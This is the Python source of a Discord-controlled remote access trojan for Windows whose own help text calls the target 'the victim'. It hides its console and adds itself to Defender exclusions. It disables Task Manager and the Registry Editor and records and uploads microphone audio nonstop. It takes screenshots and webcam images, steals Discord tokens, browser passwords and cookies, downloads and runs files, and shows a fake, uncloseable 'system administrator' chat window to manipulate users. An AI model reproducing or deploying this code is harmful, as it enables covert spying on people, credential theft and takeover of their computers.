# Place this at the very top of the file, before any other imports
import ctypes
import platform
import sys
import os

# Immediately hide console window at the earliest possible moment
if platform.system() == "Windows":
    try:
        # Get the console window handle
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd != 0:
            # Hide the console window (0 = SW_HIDE)
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

# Now continue with the rest of your imports
from urllib.request import urlretrieve
import shutil
import discord
from discord.ext import commands
import pyautogui
from datetime import datetime
import cv2
import pyaudio
import wave
import threading
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
import time
import numpy as np
import socket
import asyncio
import glob
import webbrowser
import re
import requests
import subprocess
import tempfile
import win32api
import win32con
import math
import base64
import json
import tkinter as tk
from Crypto.Cipher import AES
from discord import Embed
from win32crypt import CryptUnprotectData
from PIL import Image, ImageTk

# Modify the elevated instance handler at the beginning of your script
if len(sys.argv) > 1 and sys.argv[1] == "--elevated" and len(sys.argv) > 2:
    # This is an elevated instance
    # Get the session ID passed from the original process
    session_id = sys.argv[2]
    
    # Add the script to Windows Defender exclusions
    try:
        # Get the full path of the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Add the script to Windows Defender exclusions using PowerShell
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{script_path}\'"'
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception:
        pass
    
    # Create a success marker file to signal back to the original process
    try:
        temp_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()))
        # Look for the session directory
        for item in os.listdir(temp_dir):
            if item.startswith("sm_") and os.path.isdir(os.path.join(temp_dir, item)):
                session_dir = os.path.join(temp_dir, item)
                # Check if this is the right session
                if os.path.exists(os.path.join(session_dir, f"{session_id}.txt")):
                    # Create a success marker
                    with open(os.path.join(session_dir, f"{session_id}_success.txt"), 'w') as f:
                        f.write("Elevated process started successfully")
                    break
    except Exception:
        # Silently fail if we can't create the marker
        pass

# Immediately hide console window at startup
if platform.system() == "Windows":
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd != 0:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        print(f"Error hiding console: {str(e)}")

# Function definitions for hiding console and relaunching
# Function definitions for hiding console and relaunching
def hide_console_window():
    """Hide the console window on Windows"""
    try:
        if platform.system() == "Windows":
            import ctypes
            # Get the console window handle
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                # Hide the console window
                ctypes.windll.user32.ShowWindow(hwnd, 0)
            return True
        return False
    except Exception as e:
        print(f"Error hiding console: {str(e)}")
        return False

def relaunch_as_hidden():
    """Relaunch the script in hidden mode if it's running in a visible console"""
    try:
        # Only needed on Windows
        if platform.system() != "Windows":
            return False
        # Get the full path of the current script
        script_path = os.path.abspath(sys.argv[0])
        # Check if we're running in a console window
        if sys.stdout.isatty():
            # We're in a console, so relaunch using pythonw (hidden)
            if script_path.endswith('.py'):
                # Create a VBS script to launch the Python script hidden
                vbs_path = os.path.join(tempfile.gettempdir(), "launch_hidden.vbs")
                with open(vbs_path, 'w') as f:
                    f.write(f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw.exe ""{script_path}""", 0, False''')
                # Execute the VBS script
                subprocess.Popen(['cscript', '//Nologo', vbs_path])
                # Delete the VBS script after a short delay
                def delete_vbs():
                    time.sleep(5)
                    try:
                        os.remove(vbs_path)
                    except:
                        pass
                threading.Thread(target=delete_vbs, daemon=True).start()
                # Exit the current process
                os._exit(0)
            return True
    except Exception as e:
        print(f"Error relaunching as hidden: {str(e)}")
        return False

# Add these functions to your code
def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            # For Unix systems, check if effective user ID is 0 (root)
            return os.geteuid() == 0
    except:
        return False

def add_to_defender_exclusions():
    """Add the current script to Windows Defender exclusions"""
    if platform.system() != "Windows":
        return False
    
    try:
        # Get the full path of the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Add the script to Windows Defender exclusions using PowerShell
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{script_path}\'"'
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        return True
    except Exception as e:
        print(f"Error adding to exclusions: {str(e)}")
        return False

def disable_registry_editor():
    """Disables the Windows Registry Editor by modifying registry settings"""
    if platform.system() != "Windows":
        return "Not a Windows system"
    
    try:
        # Check if running as admin
        admin_status = is_admin()
        
        import winreg
        success = False
        user_error = "Not attempted"
        machine_error = "Not attempted"
        
        # Try HKEY_CURRENT_USER first (might work without admin on some Windows versions)
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            success = True
        except Exception as e:
            user_error = str(e)
        
        # If admin, also try HKEY_LOCAL_MACHINE (more effective on newer Windows)
        if admin_status:
            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                success = True
            except Exception as e:
                machine_error = str(e)
        
        if success:
            return "Success"
        else:
            if admin_status:
                return f"Failed despite admin rights. Errors: HKCU: {user_error}, HKLM: {machine_error}"
            else:
                return f"Failed without admin rights. Error: {user_error}. Try running as administrator."
            
    except Exception as e:
        return f"Error: {str(e)}"

def disable_task_manager():
    """Disables the Windows Task Manager by modifying registry settings"""
    if platform.system() != "Windows":
        return False
    
    try:
        import winreg
        # Path to the registry key that controls Task Manager
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        
        # Open or create the key
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        # Set the DisableTaskMgr value to 1 (disabled)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Error disabling Task Manager: {str(e)}")
        return False

def create_chat_window(author_name, channel_id):
    global CHAT_ACTIVE, CHAT_WINDOW, receive_chat_message
    
    try:
        # Create the main window
        root = tk.Tk()
        CHAT_WINDOW = root
        root.title(f"IMPORTANT MESSAGE FROM SYSTEM ADMINISTRATOR")
        root.geometry("500x600")
        root.configure(bg="#f0f0f0")
        
        # Make the window always on top and difficult to close/minimize
        root.attributes("-topmost", True)
        
        # Prevent minimizing
        if platform.system() == "Windows":
            # This prevents minimizing by removing the minimize button
            root.resizable(False, False)
            # Remove minimize/maximize buttons, only show close button which we override
            root.attributes("-toolwindow", 1)
            # Force the window to stay on top even when minimized
            hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
            style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
            style = style & ~0x20000  # Remove WS_MINIMIZEBOX
            ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)
            
            # Intercept keyboard events to block Alt+F4, Alt+Tab, etc.
            def block_key(event):
                # Block Alt+F4
                if event.state == 8 and event.keysym == 'F4':
                    return "break"
                # Block Alt+Tab
                if event.state == 8 and event.keysym == 'Tab':
                    return "break"
                # Block Windows key
                if event.keysym == 'Super_L' or event.keysym == 'Super_R':
                    return "break"
                return None
            
            root.bind_all("<Key>", block_key)
        
        # Override the close button
        def on_close():
            # Show a warning message but don't close
            tk.messagebox.showwarning(
                "Warning", 
                "This chat window cannot be closed until the administrator ends the session."
            )
        
        root.protocol("WM_DELETE_WINDOW", on_close)
        
        # Create a header with warning
        header_frame = tk.Frame(root, bg="#ff0000")
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        
        header_label = tk.Label(
            header_frame, 
            text="IMPORTANT: DO NOT CLOSE THIS WINDOW", 
            font=("Arial", 14, "bold"),
            fg="white",
            bg="#ff0000",
            pady=10
        )
        header_label.pack()
        
        # Create a frame for the chat history
        chat_frame = tk.Frame(root, bg="#f0f0f0")
        chat_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create a scrollable text area for chat history
        chat_history = tk.Text(
            chat_frame, 
            wrap=tk.WORD, 
            state=tk.DISABLED,
            font=("Arial", 11),
            bg="white"
        )
        scrollbar = tk.Scrollbar(chat_frame, command=chat_history.yview)
        chat_history.configure(yscrollcommand=scrollbar.set)
        
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        chat_history.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Create a frame for the input area
        input_frame = tk.Frame(root, bg="#f0f0f0")
        input_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Create an entry widget for user input
        user_input = tk.Entry(input_frame, font=("Arial", 11))
        user_input.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Function to add messages to the chat history
        def add_message(sender, message, is_system=False):
            chat_history.config(state=tk.NORMAL)
            
            # Format based on message type
            if is_system:
                chat_history.insert(tk.END, f"SYSTEM: {message}\n", "system")
                chat_history.tag_configure("system", foreground="red", font=("Arial", 11, "bold"))
            else:
                timestamp = datetime.now().strftime("%H:%M:%S")
                chat_history.insert(tk.END, f"[{timestamp}] {sender}: ", "sender")
                chat_history.insert(tk.END, f"{message}\n", "message")
                chat_history.tag_configure("sender", foreground="blue", font=("Arial", 11, "bold"))
                chat_history.tag_configure("message", font=("Arial", 11))
            
            chat_history.see(tk.END)  # Scroll to the bottom
            chat_history.config(state=tk.DISABLED)
        
        # Add welcome messages
        add_message("System", "IMPORTANT SECURITY NOTIFICATION", True)
        add_message("System", f"A security administrator ({author_name}) has initiated an emergency chat session with your system.", True)
        add_message("System", "Please respond promptly to any questions or instructions.", True)
        add_message("System", "DO NOT CLOSE THIS WINDOW until the session is complete.", True)
        add_message(author_name, "Hello, I need to verify some information about your system. Please stand by.")
        
        # Function to send user message to Discord
        def send_message(event=None):
            message = user_input.get().strip()
            if message:
                # Clear the input field
                user_input.delete(0, tk.END)
                
                # Add the message to the chat history
                add_message(SYSTEM_NAME, message)
                
                # Send the message to Discord
                asyncio.run_coroutine_threadsafe(
                    send_to_discord(channel_id, message),
                    bot.loop
                )
        
        # Bind the Enter key to send messages
        user_input.bind("<Return>", send_message)
        
        # Create a send button
        send_button = tk.Button(
            input_frame, 
            text="Send", 
            command=send_message,
            bg="#4CAF50",
            fg="white",
            font=("Arial", 10, "bold"),
            padx=10
        )
        send_button.pack(side=tk.RIGHT, padx=(5, 0))
        
        # Function to receive messages from Discord
        def receive_message(sender, message):
            add_message(sender, message)
            
            # Flash the window to get attention
            if platform.system() == "Windows":
                try:
                    # Flash the window
                    ctypes.windll.user32.FlashWindow(root.winfo_id(), True)
                except Exception as e:
                    print(f"Error flashing window: {str(e)}")
            
            # Play a notification sound
            try:
                import winsound
                winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
            except:
                pass
        
        # Store the receive function globally so it can be called from the bot
        global receive_chat_message
        receive_chat_message = receive_message
        
        # Set the chat as active
        CHAT_ACTIVE = True
        
        # Focus the input field
        user_input.focus_set()
        
        # Center the window on screen
        root.update_idletasks()
        width = root.winfo_width()
        height = root.winfo_height()
        x = (root.winfo_screenwidth() // 2) - (width // 2)
        y = (root.winfo_screenheight() // 2) - (height // 2)
        root.geometry(f'{width}x{height}+{x}+{y}')
        
        # Start the Tkinter main loop
        root.mainloop()
        
        # When the loop exits, set chat as inactive
        CHAT_ACTIVE = False
        
    except Exception as e:
        print(f"Error creating chat window: {str(e)}")
        CHAT_ACTIVE = False

async def send_to_discord(channel_id, message):
    """Send a message from the chat window to Discord"""
    try:
        channel = bot.get_channel(channel_id)
        if channel:
            await channel.send(f"💬 **{SYSTEM_NAME} says:** {message}")
    except Exception as e:
        print(f"Error sending message to Discord: {str(e)}")

# Bot configuration
TOKEN = '' # Replace with your actual Discord token
PREFIX = '!' # Set up intents (permissions)

# Set up intents (permissions)
intents = discord.Intents.default()
intents.message_content = True

# Create bot instance with disabled default help command
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

CHAT_ACTIVE = False
CHAT_WINDOW = None
CHAT_THREAD = None

# Add this global check function right here
@bot.check
async def check_system_channel(ctx):
    """Global check that runs before every command"""
    # Allow commands in DMs
    if ctx.guild is None:
        return True
        
    # Get reference to global variables
    global SYSTEM_CHANNEL_ID, AUDIO_CHANNEL_ID
        
    # Check if the command is in the system's channel
    if ctx.channel.id == SYSTEM_CHANNEL_ID:
        return True
        
    # Check if the channel name contains this system's ID
    # This allows commands to work in channels specifically named for this system
    if SYSTEM_ID in ctx.channel.name.lower():
        # Update the system channel ID to this channel
        SYSTEM_CHANNEL_ID = ctx.channel.id
        AUDIO_CHANNEL_ID = ctx.channel.id
        return True
        
    # Silently ignore commands in other channels
    return False

# Audio recording settings
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
RECORD_SECONDS = 30
GAIN = 5.0  # Increase this value to amplify the audio (be careful with too high values)

# Screen update tracking
screen_update_tasks = {}  # Dictionary to track active screen update tasks

# Update your jumpscare configuration with the correct URLs
JUMPSCARE_VIDEO_URL = "https://github.com/gamerpaul546/daw/raw/refs/heads/main/Untitled%20video%20-%20Made%20with%20Clipchamp%20(2).mp4"
JUMPSCARE_AUDIO_URL = "https://github.com/gamerpaul546/daw/raw/refs/heads/main/(Audio)%20jumpscare.m4a"

# System identification
SYSTEM_NAME = platform.node()
try:
    # Get the external IP address using api.ipify.org
    response = requests.get('https://api.ipify.org')
    if response.status_code == 200:
        SYSTEM_IP = response.text
    else:
        # Fallback to local IP if external IP fetch fails
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        SYSTEM_IP = s.getsockname()[0]
        s.close()
except:
    SYSTEM_IP = "unknown-ip"

# Create a unique identifier for this system
# This helps prevent duplicate channels
SYSTEM_ID = f"{SYSTEM_NAME}-{SYSTEM_IP}".lower().replace(' ', '-')
# Remove any characters that aren't allowed in Discord channel names
SYSTEM_ID = re.sub(r'[^a-z0-9_-]', '', SYSTEM_ID)

# Channel for this system
SYSTEM_CHANNEL_ID = None
AUDIO_CHANNEL_ID = None

# Flag to track if recording is in progress
is_recording = False

# Lock for audio processing
audio_lock = threading.Lock()

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')
    print(f'Bot is in {len(bot.guilds)} guilds')
    
    # Check if running as admin and add to exclusions if so
    if is_admin():
        add_to_defender_exclusions()
        print("Running with admin privileges - added to Defender exclusions")
    
    # Clean up any existing audio files at startup
    cleanup_audio_files()
    
    # Create or find a channel for this system
    await setup_system_channel()
    
    # Start background recording
    threading.Thread(target=background_recording, daemon=True).start()

@bot.event
async def on_message(message):
    # Ignore messages from the bot itself
    if message.author == bot.user:
        return
    
    # Safety check - if chat window doesn't exist but CHAT_ACTIVE is True, reset it
    global CHAT_ACTIVE, CHAT_WINDOW
    if CHAT_ACTIVE and (not CHAT_WINDOW or not hasattr(CHAT_WINDOW, 'winfo_exists') or not CHAT_WINDOW.winfo_exists()):
        CHAT_ACTIVE = False
        print("Chat window no longer exists - resetting CHAT_ACTIVE flag")
    
    # Only process chat messages if chat is truly active
    if CHAT_ACTIVE and CHAT_WINDOW and hasattr(CHAT_WINDOW, 'winfo_exists') and CHAT_WINDOW.winfo_exists():
        # Only treat non-command messages as chat messages
        if not message.content.startswith(PREFIX):
            if 'receive_chat_message' in globals():
                # Get the sender's name
                sender_name = message.author.name
                
                try:
                    # Call the receive function in the main thread
                    CHAT_WINDOW.after(0, lambda: receive_chat_message(sender_name, message.content))
                except Exception as e:
                    print(f"Error sending message to chat window: {str(e)}")
                    # If there's an error, reset the chat active flag
                    CHAT_ACTIVE = False
    
    # Always process commands, regardless of chat state
    await bot.process_commands(message)

def cleanup_audio_files():
    """Clean up any existing audio files from previous runs"""
    audio_files = glob.glob("audio_*.wav")
    for file in audio_files:
        try:
            os.remove(file)
            print(f"Cleaned up old audio file: {file}")
        except Exception as e:
            print(f"Error cleaning up file {file}: {str(e)}")

async def setup_system_channel():
    global SYSTEM_CHANNEL_ID, AUDIO_CHANNEL_ID
    
    # Use the first guild the bot is in
    if len(bot.guilds) == 0:
        print("Bot is not in any guilds. Please add the bot to a guild.")
        return
    
    guild = bot.guilds[0]
    channel_name = SYSTEM_ID
    
    # Check if channel already exists for this system
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
    
    if existing_channel:
        SYSTEM_CHANNEL_ID = existing_channel.id
        AUDIO_CHANNEL_ID = existing_channel.id
        print(f"Using existing channel: #{channel_name} (ID: {SYSTEM_CHANNEL_ID})")
        
        # Send a reconnection message
        try:
            await existing_channel.send(f"🔄 **System Reconnected**\n"
                                       f"**System Name:** {SYSTEM_NAME}\n"
                                       f"**IP Address:** {SYSTEM_IP}\n"
                                       f"**Reconnected at:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            print(f"Error sending reconnection message: {str(e)}")
    else:
        # Create a new channel for this system
        try:
            channel = await guild.create_text_channel(channel_name)
            SYSTEM_CHANNEL_ID = channel.id
            AUDIO_CHANNEL_ID = channel.id
            print(f"Created new channel: #{channel_name} (ID: {SYSTEM_CHANNEL_ID})")
            
            # Send initial message to the channel
            await channel.send(f"🖥️ **New System Connected**\n"
                              f"**System Name:** {SYSTEM_NAME}\n"
                              f"**IP Address:** {SYSTEM_IP}\n"
                              f"**OS:** {platform.system()} {platform.release()}\n"
                              f"**Connected at:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                              f"Use `{PREFIX}help` to see available commands.")
        except Exception as e:
            print(f"Error creating channel: {str(e)}")

def amplify_audio(audio_data, gain):
    """Amplify the audio data by the given gain factor"""
    # Convert bytes to numpy array
    audio_array = np.frombuffer(audio_data, dtype=np.int16)
    
    # Apply gain (with clipping to prevent overflow)
    audio_array = np.clip(audio_array * gain, -32768, 32767).astype(np.int16)
    
    # Convert back to bytes
    return audio_array.tobytes()

def background_recording():
    global is_recording
    # Wait for channel to be set up
    while AUDIO_CHANNEL_ID is None:
        time.sleep(1)
    
    p = pyaudio.PyAudio()
    while True:
        with audio_lock:
            # Use lock to prevent concurrent recording/uploading
            if not is_recording:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                # Use system temp directory instead of current directory
                temp_dir = tempfile.gettempdir()
                audio_path = os.path.join(temp_dir, f'audio_{timestamp}.wav')
                
                # Open audio stream
                stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
                print(f"Recording started at {timestamp}")
                is_recording = True
                frames = []
                
                # Record for RECORD_SECONDS
                for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    frames.append(data)
                
                # Stop recording
                stream.stop_stream()
                stream.close()
                
                # Amplify the audio
                amplified_frames = [amplify_audio(frame, GAIN) for frame in frames]
                
                # Save the audio file
                wf = wave.open(audio_path, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(amplified_frames))
                wf.close()
                print(f"Recording finished and saved to {audio_path}")
                
                # Send the audio file to the designated channel
                # Use asyncio.run_coroutine_threadsafe to properly run the coroutine from a thread
                future = asyncio.run_coroutine_threadsafe(
                    send_audio_to_channel(audio_path, timestamp), bot.loop
                )
                
                # Wait for the upload to complete before starting a new recording
                try:
                    future.result(timeout=60)  # Wait up to 60 seconds for upload
                except Exception as e:
                    print(f"Error waiting for upload: {str(e)}")
                    # Make sure to delete the file if upload fails
                    if os.path.exists(audio_path):
                        try:
                            os.remove(audio_path)
                            print(f"Deleted file {audio_path} after upload error")
                        except:
                            pass
                
                is_recording = False

async def send_audio_to_channel(audio_path, timestamp):
    """Send the audio recording to the designated channel"""
    if not AUDIO_CHANNEL_ID:
        print("No channel ID set for audio uploads")
        # Delete the file even if we can't upload it
        if os.path.exists(audio_path):
            os.remove(audio_path)
            print(f"Deleted file {audio_path} (no upload channel set)")
        return
    
    channel = bot.get_channel(AUDIO_CHANNEL_ID)
    if not channel:
        print(f"Could not find channel with ID {AUDIO_CHANNEL_ID}")
        # Delete the file even if we can't find the channel
        if os.path.exists(audio_path):
            os.remove(audio_path)
            print(f"Deleted file {audio_path} (channel not found)")
        return
    
    try:
        # Check if file exists before trying to upload
        if not os.path.exists(audio_path):
            print(f"File {audio_path} does not exist, cannot upload")
            return
        
        await channel.send(f'🎙️ Audio recording from {SYSTEM_NAME} at {timestamp}', file=discord.File(audio_path))
        print(f"Successfully sent audio recording to channel {channel.name}")
    except Exception as e:
        print(f"Error sending audio to channel: {str(e)}")
    finally:
        # Always delete the file, whether upload succeeded or failed
        try:
            if os.path.exists(audio_path):
                os.remove(audio_path)
                print(f"Deleted file {audio_path}")
        except Exception as e:
            print(f"Error deleting file {audio_path}: {str(e)}")

@bot.command(name='help', help='Shows this help message')
async def help_command(ctx):
    # Create a system-specific help message
    embed = discord.Embed(
        title=f"Commands for {SYSTEM_NAME}",
        description=f"These commands control the system at IP: {SYSTEM_IP}",
        color=discord.Color.blue()
    )
    
    # Add command fields to the embed
    embed.add_field(
        name=f"{PREFIX}screenshot",
        value="Takes a screenshot of the system and sends it to the channel",
        inline=False
    )
    
    embed.add_field(
       name=f"{PREFIX}chat",
       value="Opens a chat where you can then talk to the victim",
       inline=False
    )
    
    embed.add_field(
       name=f"{PREFIX}endchat",
       value="Will close the chat window",
       inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}grabtoken",
        value="Grabs all tokens on victims computer",
        inline=False
    )
    
    embed.add_field(
       name=f"{PREFIX}disableav",
       value="Doesnt Disable AV but adds itself to exclusions if it has admin",
       inline=False
    )
    
    embed.add_field(
       name=f"{PREFIX}getadmin",
       value="Pops up with a UAC prompt and if accepted you get admin",
       inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}webcam",
        value="Takes a photo using the system's webcam and sends it to the channel",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}screen [duration]",
        value="Provides a live view of the screen, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}stopscreen",
        value="Stops the live screen view",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}grabpasswords",
        value="Might grab all passwords depending on browser",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}webcamstream [duration]",
        value="Provides a live view of the webcam, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}stopwebcam",
        value="Stops the live webcam view",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}media",
        value="Plays a media file on the target system. Attach an MP4, MP3, or other media file to your message",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}search [query]",
        value="Searches Google for the specified query and displays it in full screen",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}background",
        value="Changes the desktop background. Either attach an image or provide a URL to an image",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}clipboard [text]",
        value="Without text: Shows the current clipboard contents. With text: Sets the clipboard to the provided text.",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}grabcookies",
        value="Grabs all cookies from browsers.",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}downloadfileandrun",
        value="Downloads an attached file and runs it on the target system. Attach the file you want to execute.",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}disableaudio",
        value="Disables (mutes) the system audio until enabled again",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}enableaudio",
        value="Enables (unmutes) the system audio",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}shutdown [delay]",
        value="Shuts down the target computer. Optional delay in seconds (default: 0)",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}end",
        value="Terminates the bot process on the target system",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}help",
        value="Shows this help message",
        inline=False
    )
    
    # Add info about background audio recording
    embed.add_field(
        name="Background Audio Recording",
        value=f"The system automatically records audio in 30-second segments and uploads them to the system's channel",
        inline=False
    )
    
    # Add footer with bot info
    embed.set_footer(text=f"System: {SYSTEM_NAME} | IP: {SYSTEM_IP}")
    
    await ctx.send(embed=embed)

@bot.command(name='screenshot', help='Takes a screenshot of the system')
async def take_screenshot(ctx):
    # Take the screenshot
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_path = f'screenshot_{timestamp}.png'
    
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        # Send the screenshot
        await ctx.send(f'📷 Screenshot from {SYSTEM_NAME} taken at {timestamp}', file=discord.File(screenshot_path))
        
        # Clean up the file after sending
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f'❌ Error taking screenshot: {str(e)}')
        # Clean up the file even if sending fails
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)

@bot.command(name='grabtoken', help='Extracts Discord tokens from the system')
async def grab_token(ctx):
    try:
        await ctx.send(f"🔍 Searching for Discord tokens on {SYSTEM_NAME}...")
        
        # Use the existing token grabber implementation
        tokens_data = grab_discord.initialize(raw_data=True)
        
        if tokens_data:
            # Create a file with the found tokens
            temp_file = f'tokens_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(f"Discord Tokens found on {SYSTEM_NAME} ({SYSTEM_IP})\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for token_json in tokens_data:
                    token_data = json.loads(token_json)
                    f.write(f"Username: {token_data['username']}\n")
                    f.write(f"Token: {token_data['token']}\n")
                    f.write(f"Nitro: {token_data['nitro']}\n")
                    f.write(f"Billing: {token_data['billing']}\n")
                    f.write(f"MFA: {token_data['mfa']}\n")
                    f.write(f"Email: {token_data['email']}\n")
                    f.write(f"Phone: {token_data['phone']}\n")
                    
                    if token_data['hq_guilds']:
                        f.write(f"HQ Guilds: {token_data['hq_guilds']}\n")
                    
                    if token_data['gift_codes']:
                        f.write(f"Gift Codes: {token_data['gift_codes']}\n")
                    
                    f.write("\n" + "-"*50 + "\n\n")
            
            # Send the file
            await ctx.send(f"🔑 Found {len(tokens_data)} Discord token(s) on {SYSTEM_NAME}:", 
                          file=discord.File(temp_file))
            
            # Clean up the file
            os.remove(temp_file)
            
            # Also send rich embeds for better visualization
            for token_json in tokens_data:
                token_data = json.loads(token_json)
                embed = create_token_embed(token_data)
                await ctx.send(embed=embed)
        else:
            await ctx.send(f"❌ No Discord tokens found on {SYSTEM_NAME}")
    
    except Exception as e:
        await ctx.send(f"❌ Error searching for tokens: {str(e)}")
        import traceback
        tb = traceback.format_exc()
        await ctx.send(f"Detailed error:\n```\n{tb[:1500]}\n```")

def create_token_embed(token_data):
    """Create a Discord embed for token data visualization"""
    embed = Embed(title=f"{token_data['username']}", color=0x0084ff)
    
    # Add token information
    embed.add_field(name="📜 Token:", value=f"```{token_data['token']}```\n\u200b", inline=False)
    embed.add_field(name="💎 Nitro:", value=f"{token_data['nitro']}", inline=False)
    embed.add_field(name="💳 Billing:", value=f"{token_data['billing']}", inline=False)
    embed.add_field(name="🔒 MFA:", value=f"{token_data['mfa']}\n\u200b", inline=False)
    embed.add_field(name="📧 Email:", value=f"{token_data['email']}", inline=False)
    embed.add_field(name="📳 Phone:", value=f"{token_data['phone']}\n\u200b", inline=False)
    
    # Add HQ Guilds if available
    if token_data['hq_guilds']:
        embed.add_field(name="🏰 HQ Guilds:", value=token_data['hq_guilds'], inline=False)
    
    # Add Gift Codes if available
    if token_data['gift_codes']:
        embed.add_field(name="\u200b\n🎁 Gift Codes:", value=token_data['gift_codes'], inline=False)
    
    return embed

# Define the grab_discord class from the provided code
class grab_discord:
    def initialize(raw_data):
        return fetch_tokens().upload(raw_data)

class extract_tokens:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()
    
    def extract(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
